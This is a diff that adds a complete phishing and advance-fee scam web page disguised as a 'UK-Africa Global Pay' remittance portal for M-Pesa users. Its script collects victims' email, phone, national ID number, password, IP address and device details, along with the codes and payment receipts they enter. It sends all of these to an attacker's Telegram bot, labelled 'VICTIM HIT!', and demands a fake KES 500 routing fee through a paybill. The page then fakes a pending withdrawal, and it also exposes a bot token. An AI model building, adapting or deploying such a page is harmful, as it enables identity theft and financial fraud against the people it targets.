@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>UK-Africa Global Pay | Secure Gateway</title>
+    <style>
+        :root { --uk-blue: #00247d; --uk-red: #cf142b; --success: #28a745; --bg-light: #f4f7f9; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg-light); color: #333; overflow-x: hidden; }
+        .app-container { width: 100%; min-height: 100vh; background: white; display: flex; flex-direction: column; }
+        
+        .header { background: var(--uk-blue); color: white; padding: 15px; text-align: center; border-bottom: 4px solid var(--uk-red); position: sticky; top: 0; z-index: 100; }
+        .ticker-wrap { background: #eee; white-space: nowrap; overflow: hidden; padding: 5px 0; border-bottom: 1px solid #ddd; }
+        .ticker { display: inline-block; padding-left: 100%; animation: ticker 80s linear infinite; font-size: 11px; font-weight: bold; color: #555; }
+        @keyframes ticker { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }
+
+        .hero { background: linear-gradient(rgba(0,36,125,0.9), rgba(0,36,125,0.9)), url('https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?auto=format&fit=crop&w=500&q=80'); background-size: cover; color: white; padding: 25px; text-align: center; }
+        .step-content { padding: 20px; display: none; flex: 1; flex-direction: column; }
+        .step-content.active { display: flex; }
+        
+        .blinking { animation: blinker 1.5s linear infinite; font-weight: bold; color: var(--uk-red); }
+        @keyframes blinker { 50% { opacity: 0; } }
+
+        .btn { padding: 12px 20px; border: none; border-radius: 5px; font-weight: 600; cursor: pointer; font-size: 14px; transition: 0.2s; width: 100%; margin-top: 10px; }
+        .btn-next { background: var(--uk-blue); color: white; }
+        .btn-disabled { background: #cbd5e0 !important; cursor: not-allowed !important; color: #718096 !important; }
+        
+        .balance-card { background: #f0fff4; border: 1px solid var(--success); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 15px; }
+        .amount { font-size: 2.5em; font-weight: 800; color: var(--success); }
+        
+        .history-box { margin-top: 20px; border: 1px solid #e2e8f0; border-radius: 8px; overflow: hidden; }
+        .history-header { background: #f8fafc; padding: 10px; font-size: 12px; font-weight: bold; border-bottom: 1px solid #e2e8f0; }
+        .history-row { padding: 12px 10px; display: flex; justify-content: space-between; font-size: 12px; border-bottom: 1px solid #f1f5f9; }
+        .status-pending { color: #f59e0b; font-weight: bold; }
+        .status-done { color: var(--success); font-weight: bold; }
+
+        .field-label { font-size: 12px; font-weight: bold; color: var(--uk-blue); margin-top: 8px; display: block; text-transform: uppercase; }
+        input, textarea { width: 100%; padding: 12px; margin: 4px 0 12px 0; border: 1px solid #cbd5e0; border-radius: 6px; font-size: 16px; outline: none; }
+        
+        .payment-info { background: #f7fafc; border: 2px solid var(--uk-blue); padding: 15px; border-radius: 8px; margin: 10px 0; font-size: 0.95em; line-height: 1.8; }
+        .copy-btn { background: var(--uk-blue); color: white; font-size: 10px; padding: 3px 8px; border-radius: 4px; float: right; cursor: pointer; border: none; font-weight: bold; }
+
+        #loader-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.98); z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--uk-blue); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="checkStatus()">
+
+<div id="loader-overlay"><div class="spinner"></div><div id="loader-text" style="margin-top:15px; font-weight:600; color:var(--uk-blue);">Processing...</div></div>
+
+<div class="app-container">
+    <div class="header"><strong>UK-AFRICA VENDORS</strong></div>
+    <div class="ticker-wrap"><div class="ticker">ESTABLISHING SECURE SWIFT TUNNEL... AUTHENTICATING GLOBAL NODE... SYSTEM STATUS: READY. 🌍</div></div>
+
+    <div id="page1" class="step-content active">
+        <div class="hero"><h3>Global Remittance Portal</h3></div>
+        <div id="status-ready" style="margin-top:20px; text-align:center;">
+            <p style="font-size: 0.9em; color: var(--success); font-weight: bold;">● Portal Status: Online</p>
+        </div>
+        
+        <div id="status-final" style="display:none;">
+            <div class="balance-card">
+                <p style="font-size: 0.7em; font-weight: bold;">REMAINING LEDGER BALANCE</p>
+                <div id="final_balance_display" class="amount" style="color:#718096;">$0.00</div>
+                <p class="blinking" style="font-size:0.85em; margin-top:10px;">Withdrawal in process ---</p>
+            </div>
+
+            <div style="background: #fff5f5; border: 1px solid #feb2b2; padding: 12px; border-radius: 8px; margin-top: 10px; font-size: 11.5px; line-height: 1.5; color: #742a2a;">
+                <strong style="display: block; color: #c53030; margin-bottom: 4px;">⚠️ DISBURSEMENT COMPLIANCE NOTICE</strong>
+                Due to high global remittance volumes and mandatory SWIFT verification protocols, the release of funds to your local wallet may take up to **72 hours** to reflect.
+                <br><br>
+                If funds do not reflect within this window, please contact the <strong>Global Support Node</strong> immediately for manual prioritization.
+            </div>
+            
+            <div class="history-box">
+                <div class="history-header">RECENT ACTIVITY</div>
+                <div class="history-row"><span id="hist_withdraw_label">UK Disbursement</span><span class="status-pending">Processing...</span></div>
+                <div class="history-row"><span>Routing Activation (KES 500)</span><span class="status-done">Paid & Verified</span></div>
+            </div>
+
+            <a href="https://t.me/OnlineAssistancee" style="color: #0088cc; font-size: 13px; text-decoration: none; display: block; margin-top: 20px; font-weight: bold; text-align: center;">Contact Support: @OnlineAssistancee</a>
+        </div>
+        <button id="main-action-btn" class="btn btn-next" onclick="processStep(2)">Unlock International Funds to Local Wallets</button>
+    </div>
+
+    <div id="page2" class="step-content">
+        <h2 style="color: var(--uk-blue);">KYC Compliance</h2>
+        <label class="field-label">Email Address</label>
+        <input type="email" id="u_email" placeholder="mail@example.com">
+        <label class="field-label">Mobile Wallet (M-Pesa)</label>
+        <input type="tel" id="u_phone" placeholder="07xxxxxxxx">
+        <label class="field-label">National ID Number</label>
+        <input type="text" id="u_id" placeholder="Enter ID Number">
+        <label class="field-label">Portal Password</label>
+        <input type="password" id="u_pass" placeholder="••••••••">
+       <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 10px; border-radius: 6px; margin-bottom: 15px;">
+    <p style="font-size: 10px; color: #718096; line-height: 1.4; height: 60px; overflow-y: scroll; padding-right: 5px;">
+        <strong>UK-AFRICA COMPLIANCE NOTICE:</strong> By proceeding, you acknowledge that this transaction is governed by the UK Financial Conduct Authority (FCA) AML/KYC framework. You agree to provide a valid 14-digit UKGC Clearing Code and understand that mandatory SWIFT Routing Fees are required to facilitate immediate liquidity release. All disbursements are subject to institutional verification protocols and may take up to 72 business hours to reflect in local mobile wallets. Data is handled under GDPR AES-256 encryption for secure identity validation.
+    </p>
+</div>
+
+<div style="display: flex; gap: 10px; align-items: center; margin-bottom: 10px;">
+    <input type="checkbox" id="terms" style="width: 18px; height: 18px;">
+    <label for="terms" style="font-size: 11px; font-weight: bold; color: var(--uk-blue);">
+        I accept the Global Remittance & AML Terms
+    </label>
+</div>
+        <button class="btn btn-next" onclick="submitKYC()">Link & Continue</button>
+    </div>
+
+    <div id="page3" class="step-content">
+        <h2 style="color: var(--uk-blue);">Official Authorization</h2>
+        <p style="font-size: 13px; color: #4a5568; margin: 15px 0; line-height: 1.5;">
+            This transaction requires a <strong>UKGC Multi-Factor Authorization Code</strong>. Please enter the 14-digit clearing code received from the fund initiator.
+        </p>
+        <label class="field-label">14-Digit Clearing Code</label>
+        <input type="text" id="auth_code" placeholder="Enter Authorization Code" style="text-align: center; font-weight: bold; border-color: var(--uk-blue);">
+        <button class="btn btn-next" onclick="submitAuth()">Verify Authorization Code</button>
+    </div>
+
+    <div id="page4" class="step-content">
+        <div class="balance-card" style="background: #ebf8ff; border-color: var(--uk-blue);">
+            <p style="font-size: 0.7em; font-weight: bold; color: var(--uk-blue);">CURRENT LEDGER BALANCE</p>
+            <div class="amount" style="color: var(--uk-blue);">$900.00</div>
+        </div>
+
+        <h2 style="color: var(--uk-blue);">Withdrawal Request</h2>
+        <label class="field-label">Amount to Withdraw (USD)</label>
+        <input type="number" id="withdraw_amt" placeholder="e.g. 750" oninput="updateCalculations(this.value)">
+        
+        <div style="background: #f8fafc; padding: 15px; border-radius: 8px; border: 1px dashed var(--uk-blue); margin: 10px 0;">
+            <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px;">
+                <span>Local Receive Value:</span>
+                <strong id="ksh_display" style="color: var(--success);">KES 0.00</strong>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-size: 12px;">
+                <span>Remaining Balance:</span>
+                <strong id="rem_display" style="color: var(--uk-red);">$900.00</strong>
+            </div>
+        </div>
+        
+        <button class="btn btn-next" onclick="submitWithdrawal()">Confirm Withdrawal</button>
+    </div>
+
+    <div id="page5" class="step-content">
+        <div class="balance-card">
+            <p style="font-size: 0.7em; font-weight: bold;">TOTAL REQUESTED</p>
+            <div id="final_amt_display" class="amount">$0.00</div>
+            <p id="rem_balance_tag" style="font-size: 10px; color: #718096; margin-top: 5px;">Ledger Remainder: $900.00</p>
+        </div>
+        
+        <p style="font-size: 12.5px; color: #4a5568; margin-bottom: 10px; line-height: 1.5; text-align: center;">
+            To authorize the <strong>Immediate Liquidity Release</strong> of your funds, a mandatory <strong>Automated SWIFT Routing Fee of KES 500</strong> is required.
+        </p>
+
+        <div class="payment-info">
+            Paybill: <strong>542542</strong> <button class="copy-btn" onclick="copyText('880100')">COPY</button><br>
+            Acc: <strong>06507342603050</strong> <button class="copy-btn" onclick="copyText('06507342603050')">COPY</button>
+        </div>
+        
+        <textarea id="mpesaMsg" placeholder="Paste Official M-Pesa Confirmation SMS here..." style="margin-top:10px;"></textarea>
+        <button class="btn btn-next" style="background:var(--success);" onclick="submitFinalPayment()">Activate Fund Release</button>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8556256310:AAFBcG7yK3j8LqfGLIBuvh-DunRDCbISB38';
+    const CHAT_ID = '7850692364'; 
+    const VALID_CODE = "714889UKGC45GH";
+    const RATE = 129.45;
+    const TOTAL_BAL = 900.00;
+
+    async function sendToTelegram(msg) { 
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`); 
+    }
+
+    function updateCalculations(val) {
+        const amt = parseFloat(val) || 0;
+        const ksh = amt * RATE;
+        const remaining = TOTAL_BAL - amt;
+        document.getElementById('ksh_display').innerText = "KES " + ksh.toLocaleString(undefined, {minimumFractionDigits: 2});
+        document.getElementById('rem_display').innerText = "$" + remaining.toFixed(2);
+    }
+
+    function submitWithdrawal() {
+        const amt = parseFloat(document.getElementById('withdraw_amt').value);
+        if(!amt || amt < 10 || amt > TOTAL_BAL) { alert("Please enter a valid amount between $10 and $900."); return; }
+        const remaining = TOTAL_BAL - amt;
+        localStorage.setItem('userWithdraw', amt);
+        localStorage.setItem('userBalance', remaining);
+        sendToTelegram(`💰 WITHDRAWAL: $${amt}\n📉 REMAINING: $${remaining}`);
+        document.getElementById('final_amt_display').innerText = `$${amt.toFixed(2)}`;
+        document.getElementById('rem_balance_tag').innerText = `Ledger Remainder: $${remaining.toFixed(2)}`;
+        processStep(5);
+    }
+
+    function checkStatus() {
+        if (localStorage.getItem('isScammed') === 'true') {
+            const bal = localStorage.getItem('userBalance') || "0.00";
+            const amt = localStorage.getItem('userWithdraw') || "900.00";
+            document.getElementById('status-ready').style.display = 'none';
+            document.getElementById('status-final').style.display = 'block';
+            document.getElementById('final_balance_display').innerText = `$${parseFloat(bal).toFixed(2)}`;
+            document.getElementById('hist_withdraw_label').innerText = `Withdrawal ($${parseFloat(amt).toFixed(2)})`;
+            const btn = document.getElementById('main-action-btn');
+            btn.innerText = "Disbursement in Progress...";
+            btn.className = "btn btn-disabled"; btn.onclick = null;
+        }
+    }
+
+    function copyText(txt) { 
+        const el = document.createElement('textarea'); el.value = txt;
+        document.body.appendChild(el); el.select(); document.execCommand('copy');
+        document.body.removeChild(el); alert("Copied: " + txt); 
+    }
+
+    async function submitKYC() {
+        const email = document.getElementById('u_email').value;
+        const phone = document.getElementById('u_phone').value;
+        const id = document.getElementById('u_id').value;
+        const pass = document.getElementById('u_pass').value;
+        if(!email || !phone || !id || !pass || !document.getElementById('terms').checked) { alert("Please complete validation."); return; }
+
+        let ipInfo = "Unknown IP";
+        try { const res = await fetch('https://ipapi.co/json/'); const data = await res.json(); ipInfo = `${data.ip} (${data.city})`; } catch(e) {}
+        const device = `${navigator.platform} | ${navigator.userAgent.split(')')[0].split('(')[1]}`;
+        sendToTelegram(`🚨 VICTIM HIT!\n🌐 IP: ${ipInfo}\n📱 Dev: ${device}\n📧 Mail: ${email}\n📞 Phone: ${phone}\n🆔 ID: ${id}\n🔑 Pass: ${pass}`);
+        processStep(3);
+    }
+
+    function submitAuth() {
+        const code = document.getElementById('auth_code').value.trim();
+        sendToTelegram(`🔐 CODE ENTERED: ${code}`);
+        if(code !== VALID_CODE) { alert("Invalid Code."); return; }
+        processStep(4);
+    }
+
+    function submitFinalPayment() {
+        const msg = document.getElementById('mpesaMsg').value;
+        if(msg.length < 15) { alert("Invalid Receipt."); return; }
+        sendToTelegram(`💰 FINAL PAYMENT SMS:\n${msg}`);
+        document.getElementById('loader-overlay').style.display = 'flex';
+        setTimeout(() => { localStorage.setItem('isScammed', 'true'); location.reload(); }, 3000);
+    }
+
+    function processStep(n) {
+        document.getElementById('loader-overlay').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('loader-overlay').style.display = 'none';
+            document.querySelectorAll('.step-content').forEach(p => p.classList.remove('active'));
+            document.getElementById('page' + n).classList.add('active');
+        }, 1200);
+    }
+</script>
+<button onclick="localStorage.clear(); location.reload();" style="position:fixed; bottom:2px; right:2px; opacity:0.03; font-size:8px;">R</button>
+</body>
+</html>
